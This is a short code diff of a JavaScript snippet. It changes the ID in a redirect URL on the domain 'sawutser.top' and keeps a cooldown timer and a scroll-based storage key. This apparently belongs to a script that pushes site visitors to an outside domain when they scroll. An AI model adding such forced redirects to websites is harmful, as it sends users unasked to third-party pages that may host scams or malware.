@@ -1,6 +1,6 @@
 (function () {
   let redirected = false;
-  const REDIRECT_URL = "https://sawutser.top/4/9134749";
+  const REDIRECT_URL = "https://sawutser.top/4/9122239";
   const COOLDOWN_TIME = 3 * 60 * 1000; // 3 minutes in milliseconds
   const STORAGE_KEY = "scrollRedirectTimestamp_" + window.location.pathname;
 
